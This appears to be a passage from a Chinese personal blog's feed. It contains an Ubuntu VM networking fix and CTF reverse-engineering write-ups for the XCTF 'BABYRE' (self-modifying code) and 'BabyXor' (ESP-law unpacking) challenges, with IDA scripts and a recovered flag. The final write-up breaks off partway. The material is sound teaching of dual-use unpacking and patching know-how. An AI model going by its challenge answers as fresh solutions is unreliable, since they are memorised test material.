src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B11.png" alt="2023ISCC-三个愿望11.png"></p>]]></content>
    
    
    <summary type="html">2023 ISCC 的一道 PWN 题，主要考察利用格式化字符串漏洞来绕过金丝雀保护</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu虚拟机网络图标消失</title>
    <link href="https://www.4ss1du0us.cn/2023/05a2fb6ec7.html"/>
    <id>https://www.4ss1du0us.cn/2023/05a2fb6ec7.html</id>
    <published>2023-05-17T08:11:01.000Z</published>
    <updated>2023-05-17T13:38:20.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>Ubuntu 虚拟机网络图标消失，整个网络模块都不见了，虚拟机也无法联网，怎么重启都没有用</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B11.png" alt="Ubuntu虚拟机网络图标消失1.png"></p><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B12.png" alt="Ubuntu虚拟机网络图标消失2.png"></p><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>原因暂时未知，莫名其妙的 bug，用着用着就单机了 QAQ</p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote><p>比较推荐这个，如果不行再尝试方法二</p></blockquote><p>在终端下，重启网络管理器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmcli network off<span class="token function">sudo</span> nmcli network on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>这个方法我之前成功过，不过有时候也没作用，主要是需要关机，很麻烦</p></blockquote><p>打开 VM 的虚拟网络编辑器，按下图箭头顺序，还原默认设置，然后再打开虚拟机即可</p><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B13.png" alt="Ubuntu虚拟机网络图标消失3.png"></p>]]></content>
    
    
    <summary type="html">有时候 VM 会有个离奇的 bug，你的网络可能会在某个不经意间就消失了，不仅网络图标没了，连设置里都找不到整个网络模块了，瞬间进入单机时代。。。</summary>
    
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="日常" scheme="https://www.4ss1du0us.cn/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>【攻防世界】BABYRE</title>
    <link href="https://www.4ss1du0us.cn/2023/0597260469.html"/>
    <id>https://www.4ss1du0us.cn/2023/0597260469.html</id>
    <published>2023-05-11T14:43:39.000Z</published>
    <updated>2023-06-07T12:34:26.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>了解 <mark>SMC 自解码的原理</mark>，使用 IDA 脚本破解 SMC 自解码</p></li><li><p><mark>新版 IDA 与 旧版 IDA 由于 API 改变，脚本写法有所不同</mark></p></li><li><p><mark>通过 IDA 远程调试绕过 SMC 自解码</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8813b6340dfc4b009c45a8cf81999a3e.babyRE">【攻防世界】BABYRE</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>IDA 打开，定位到主函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE1.png" alt="攻防世界_BABYRE1.png"><br>逻辑感觉很简单<br>首先对 <code>judge[]</code> 数组做异或操作，跟进 <code>judge[]</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE2.png" alt="攻防世界_BABYRE2.png"><br>要求用户输入 <code>s</code>，<code>v5</code> 是 <code>s</code> 的长度，只要满足 <code>if(v5 == 14 &amp;&amp; (*judge)(s))</code> 就能得到 flag</p></li><li><p>但是乍一看，这个条件好像有哪里怪怪的<br><code>v5 == 14</code> 这个好理解，但是 <code>(*judge)(s)</code> 就很奇怪<br>前面的 <code>jugde[]</code> 是个数组，怎么这里变成一个函数了？</p></li><li><p>本来一度摸不着头脑，注意到刚开始的异或操作：<code>for ( i = 0; i &lt;= 181; ++i )</code><br>这里循环了 182 次，我们再回到 <code>judge[]</code> 定义的地方<br><code>judge</code> 的起始地址是 <code>0x600B00</code>，182 就是 <code>0xB6</code><br>那结尾的地址就是 <code>0x600B00 + 0xB6 - 1 = 0x600BB5</code></p></li><li><p>从上往下跟过去看一下 <code>judge</code> 后面的内容<br>但是内容都是这样的十六进制数据<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE3.png" alt="攻防世界_BABYRE3.png"></p></li><li><p>联想到程序中的数据、指令、代码其实都是二进制数据形式存放的<br><strong>于是猜测这个 <code>judge</code> 可能本来就不是一个数组，而是函数<br>这些内容其实就是函数里的数据，只是经过了加密处理，程序开头的异或操作可能就是一种对 <code>judge</code> 的解密，把 <code>judge</code> 恢复成了正常的函数</strong>（其实就是 <code>SMC</code> 自解码）</p></li><li><p><mark>首先按照这个主函数给出的逻辑对 <code>judge</code> 进行解密</mark><br>因为异或的数据比较多，输入<code>快捷键 shift + F2</code> 打开 IDA 的脚本编辑器，输入如下脚本：<br>（适用于 IDA 7.0 以后的版本）</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>在 IDA 7.0 以前的版本中，这个脚本应该这么写（网上很多 WP 就是这么写的）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add <span class="token operator">=</span> <span class="token number">0x600b00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是 IDA 7.0 以后，官方对 API 进行了更改<br>如果还是按老版本来写，会报出：<br><code>NameError: name &#39;PatchByte&#39; is not defined</code><br><code>NameError: name &#39;Byte&#39; is not defined</code><br>等错误，因为 <code>PatchByte</code>、<code>Byte</code> 已经不能直接用于新版的 IDA 了</p><p><em>详见《IDA新版与旧版的API变更》</em></p></blockquote><ol start="7"><li><p>可以看到脚本执行前后 <code>judge</code> 中数据的变化<br>脚本执行前：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE4.png" alt="攻防世界_BABYRE4.png"><br>脚本执行后：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE5.png" alt="攻防世界_BABYRE5.png"></p></li><li><p>接下来把这些数据转化为代码<br>从 <code>judge</code> 的首地址 <code>0x600B00</code> 开始，到结尾的位置 <code>0x600BB5</code>，一路按 <code>快捷键 C</code> 将数据转化为代码<br>遇到 IDA 弹窗的，直接转代码，无视即可<br>（<strong>或者直接在 <code>judge</code> 的首地址 <code>C</code> 一下，IDA 会一路将可以转代码的地址全部转过来，最后 <code>P</code> 一下生成函数</strong>）<br>全部 <code>C</code> 完之后如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE6.png" alt="攻防世界_BABYRE6.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE7.png" alt="攻防世界_BABYRE7.png"><br>然后在 <code>judge</code> 首地址的位置，按 <code>快捷键 P</code> 将代码生成函数<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE8.png" alt="攻防世界_BABYRE8.png"><br>最后，像正常函数一样按 <code>快捷键 F5</code> 就可以快乐反编译了</p></li><li><p>得到 <code>judge()</code> 函数的内容如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE9.png" alt="攻防世界_BABYRE9.png"><br>代码逻辑比较简单，定义了 <code>v2 = &quot;fmcd\x7F&quot;</code>，<code>v3 = &quot;k7d;V&amp;#96;np&quot;</code><br>将输入异或后要与 <code>v2</code> 相等<br>根据循环次数 14 可知，这里是将 <code>v2</code> 和 <code>v3</code> 拼接起来了<br>也可以通过汇编代码查看：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE11.png" alt="攻防世界_BABYRE11.png"><br>接下来编写脚本即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">"fmcd\x7Fk7d;V`;np"</span>  flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>考虑到 <code>judge</code> 是在程序执行过程中自己解码的，所以可以通过动态调试下断点，先让程序自己解码，然后我们再观察解码后的内容</p></li><li><p>由于是 Linux 端的 elf 文件，开启远程调试<br>远程调试的方法<em>详见《IDA的基础和使用》</em></p></li><li><p>在调试之前<br>先在第一条指令 <code>push    rbp</code> 的地方下一个断点<br>然后在输入 <code>call    ___isoc99_scanf</code> 的地方下断点<br>然后开始调试</p></li><li><p>程序开始时停在我们下的第一个断点处<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE12.png" alt="攻防世界_BABYRE12.png"><br>在第二个断点处，<code>右键 --&gt; Run to cursor</code> 直接让程序运行到这里<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE13.png" alt="攻防世界_BABYRE13.png"><br>可以看到，程序的 <code>RIP</code> 指向了我们第二个断点的地方：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE14.png" alt="攻防世界_BABYRE14.png"></p></li><li><p>然后 <code>F8</code> 单步步过<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE15.png" alt="攻防世界_BABYRE15.png"><br>Linux 中程序已经开始让我们输入<br>这里先随便输入一个值，例如我输入：1<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE16.png" alt="攻防世界_BABYRE16.png"><br>程序越过了 scanf 输入，<code>RIP</code> 指向下一条命令</p></li><li><p>由于下面的 <code>jnz     short loc_400698</code> 这一条指令会跳转到 <code>loc_400698</code><br>这个位置是输出 “Wrong!” 用的，并且会导致程序直接结束<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE17.png" alt="攻防世界_BABYRE17.png"><br>所以我们需要<strong>在 <code>jnz     short loc_400698</code> 这一条指令之后，设置一个新的 <code>RIP</code><br>这样一来，输入 “Wrong!” 后，可以迫使程序继续跳转到我们设置的 <code>RIP</code> 的地方，从而绕过输入错误导致的退出<br>但也要注意，我们的目的是让程序自己解码 <code>judge</code> 函数后查看 <code>judge</code> 的内容<br>所以这个 RIP 一定要设置在调用 <code>judge</code> 函数之前，不然无法进入到 <code>judge</code> 函数</strong></p></li><li><p>例如，我将 <code>RIP</code> 设置在 <code>jnz     short loc_400698</code> 的后面一句，即：地址 <code>0x40067A</code> 处<br>然后 <code>右键 --&gt; set IP</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE18.png" alt="攻防世界_BABYRE18.png"><br>同时，在 <code>call    rdx ; judge</code> 调用 <code>judge</code> 函数的地方 <code>F2</code> 下一个断点<br>然后我们直接 <code>F8</code> 就会跳转到刚刚设置 <code>RIP</code> 的位置，从而绕过 <code>loc_400698</code><br>继续 <code>F8</code> 执行到调用 <code>judge</code> 函数的地方，IDA 会询问是否进入这个地址<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE20.png" alt="攻防世界_BABYRE20.png"><br>选择 <code>&quot;Yes&quot;</code>，程序就会进入 <code>judge</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE21.png" alt="攻防世界_BABYRE21.png"><br>这个就是程序自己解码出来的 <code>judge</code> 函数的内容<br>然后选择 <code>judge</code> 函数的内容，使用 <code>快捷键 P</code> 将代码生成函数<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE22.png" alt="攻防世界_BABYRE22.png"><br>最后 <code>F5</code> 即可将 <code>judge</code> 函数反汇编<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE23.png" alt="攻防世界_BABYRE23.png"></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{n1c3_j0b}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE10.png" alt="攻防世界_BABYRE10.png"></p>]]></content>
    
    
    <summary type="html">攻防世界的一道 SMC 自解码题，可以使用 IDA 脚本和动态调试绕过，感觉还是比较经典的，记录一下</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>IDA新版与旧版的API变更</title>
    <link href="https://www.4ss1du0us.cn/2023/05bbb01dd.html"/>
    <id>https://www.4ss1du0us.cn/2023/05bbb01dd.html</id>
    <published>2023-05-11T08:11:01.000Z</published>
    <updated>2023-05-12T04:00:01.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDA-的变更"><a href="#IDA-的变更" class="headerlink" title="IDA 的变更"></a>IDA 的变更</h2><blockquote><p>在做逆向的时候，有时会涉及到对硬指令的更改，不论是直接修改还是异或之类的，由于数据量比较大，所以会用到 IDA 提供的脚本编辑器（<code>shift + F2</code>）</p><p>但是网上有些 WP 给出的是比较旧的 IDA 脚本，在新版 IDA 中使用会报出各种 <code>&quot;NameError: name xxx is not defined&quot;</code> 的错误，这是因为 IDA 官方在新版中修改了部分 API 的名称，导致新旧版本不互通</p></blockquote><hr><h3 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h3><ul><li>在旧版本中：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600b00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>在新版本中</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>在 IDA 7.0 以后的版本中，要将：<br><code>idc.PatchByte()</code> 改为 <code>ida_bytes.patch_byte()</code><br><code>idc.Byte()</code> 改为 <code>idc.get_wide_byte()</code></p></blockquote><hr><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><blockquote><p>网上解决方法提到了很多，但是我尝试之后，发现大部分方法在我使用的 <a href="https://www.52pojie.cn/">吾爱破解论坛</a> 版的 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> 上无效，最后我是在 IDA 官方文档上解决</p><p>为避免大家再次踩坑，所以记录一下</p></blockquote><hr><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><blockquote><p>Hex-Rays 在官网的 <code>The guide</code> 部分列出了新版与旧版 IDA 中 API 的名称变化，需要时可以 <code>ctrl + F</code> 自行查找 API 名称是否变动（一般旧版在函数名前加上 idc，例如 <code>idc.xxx()</code>）</p></blockquote><ul><li>官网地址：<br>  <a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">Porting from IDAPython 6.x-7.3, to 7.4</a></li></ul><hr><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><blockquote><p>其他方法在我的 IDA 版本中无效，但是也搜集了一下，说不定其他版本可以</p></blockquote><ul><li>链接：（见方法 1、方法 2）<br>  <a href="https://www.52pojie.cn/thread-1403005-1-1.html">关于IDA7.5 IDApython api差异问题及解决办法 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></li></ul>]]></content>
    
    
    <summary type="html">有时候网上的 WP 中给出的 IDA 脚本会报出 “NameError: name &#39;PatchByte&#39; is not defined” 等错误，因为有些 API 在新版中被更改了，导致 IDA 老版本与新版本脚本不互通</summary>
    
    
    
    <category term="IDA" scheme="https://www.4ss1du0us.cn/categories/IDA/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【攻防世界】BabyXor</title>
    <link href="https://www.4ss1du0us.cn/2023/055c53cc97.html"/>
    <id>https://www.4ss1du0us.cn/2023/055c53cc97.html</id>
    <published>2023-05-10T14:43:39.000Z</published>
    <updated>2023-06-07T12:34:43.984Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>使用 ESP 定律法进行脱壳</mark></p></li><li><p>使用 <code>int __cdecl _filbuf(FILE *)</code> 函数实现 <code>get</code> 输入</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1c1c2eff3fdc4f1893aa0b72c6c9f116.zip">【攻防世界】BabyXor</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>用 exeinfo PE 打开：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor1.png" alt="攻防世界_BabyXor1.png"><br>貌似有壳，提示用 DIE v3.x 查看，但是依然检测不出来<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor2.png" alt="攻防世界_BabyXor2.png"></p></li><li><p>用 IDA 打开，发现无法反汇编：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor3.png" alt="攻防世界_BabyXor3.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor4.png" alt="攻防世界_BabyXor4.png"></p></li><li><p>因为加了壳，IDA 中什么都看不到<br>先用 OllyDBG 打开调试：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor5.png" alt="攻防世界_BabyXor5.png"><br>首先看到 <code>pushad</code><br><code>pushad</code> 是将所有的寄存器压栈，一般是开始位置<br>在地址 <code>0x0043F01E</code> 之后，有很多 <code>add byte ptr ds:[eax], al</code> 的操作，无法直接看到正常的汇编代码<br>但是在地址 <code>0x0043F012</code> 到 <code>0x0043F016</code> 之间可以看到一个循环操作：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0043F</span><span class="token number">012</span>    <span class="token number">8033</span> <span class="token number">23</span>         xor byte ptr ds<span class="token operator">:</span><span class="token punctuation">[</span>ebx<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token number">0043F</span><span class="token number">015</span>    <span class="token number">43</span>              inc ebx<span class="token number">0043F</span><span class="token number">016</span>  <span class="token operator">^</span> E0 FA           loopdne <span class="token keyword">short</span> babyXor<span class="token punctuation">.</span><span class="token number">0043F</span><span class="token number">012</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>这里使用循环 xor 来修正代码，所以导致 IDA 无法正常解析<br>从 <code>pushad</code> 开始<br><strong>先 F8 单步步过一次</strong>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor6.png" alt="攻防世界_BabyXor6.png"><br><strong>观察右侧寄存器窗口，发现 EAX ~ EDI 中只有 ESP 为红色，说明可以使用 ESP 定律进行脱壳</strong></p></li><li><p>在寄存器窗口中选中 ESP，<code>右键 --&gt; 数据窗口中跟随</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor7.png" alt="攻防世界_BabyXor7.png"><br>注意数据窗口中是否跳转：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor8.png" alt="攻防世界_BabyXor8.png"><br>从该地址处的第一个字节开始（我这里是 00），<strong>左键选择任意长度的数据</strong><br>然后<code>右键 --&gt; 断点 --&gt; 硬件访问 --&gt; Byte/Word/Dword</code>（三选一，均可）<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor9.png" alt="攻防世界_BabyXor9.png"><br>检查一下断点是否成功：<code>调试 --&gt; 硬件断点</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor10.png" alt="攻防世界_BabyXor10.png"><br>直接 <code>F9</code> 运行程序<br>然后 <code>F8</code> 连续单步步过找到 OEP（程序的入口点）<br>程序停在地址 <code>0x0043F019</code> 的位置<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor11.png" alt="攻防世界_BabyXor11.png"><br>在脱壳之前，先删除前面下的断点：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor12.png" alt="攻防世界_BabyXor12.png"><br>在停下的地址处：<code>右键 --&gt; 用 OllyDump脱壳调试进程</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor13.png" alt="攻防世界_BabyXor13.png"><br>点击脱壳，并将脱壳后的程序进行保存<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor14.png" alt="攻防世界_BabyXor14.png"></p></li><li><p>将保存后的程序用 exeinfo PE 打开：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor15.png" alt="攻防世界_BabyXor15.png"><br>已经显示无壳<br>用 IDA 打开：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor16.png" alt="攻防世界_BabyXor16.png"><br>已经可以被 IDA 正常分析了，脱壳成功</p></li><li><p>进入主函数<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor17.png" alt="攻防世界_BabyXor17.png"><br>开始的两句作用是输出：”世界上最简单的Xor”<br>注意到后面有一个 <code>if else</code> 语句：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor18.png" alt="攻防世界_BabyXor18.png"><br>这个不是很懂，但是在网上看到了比较好的解释：<a href="https://www.cnblogs.com/volcanol/archive/2011/06/09/2076907.html">C语言学习趣事_关于C语言中的输入输出流_续一 - volcanol</a><br>这段代码实现的是 <code>getc()</code> 函数，即：获取用户的输入<br>其实根据运行程序时的输出，也大致可以猜到，不影响做题</p></li></ol><blockquote><p><code>getc()</code></p><p>在 VC 6.0 中有两个 <code>get()</code> 的定义， 一个是宏，一个是函数</p><ol><li>宏的定义如下：<br>  <code>#define getc(_stream) 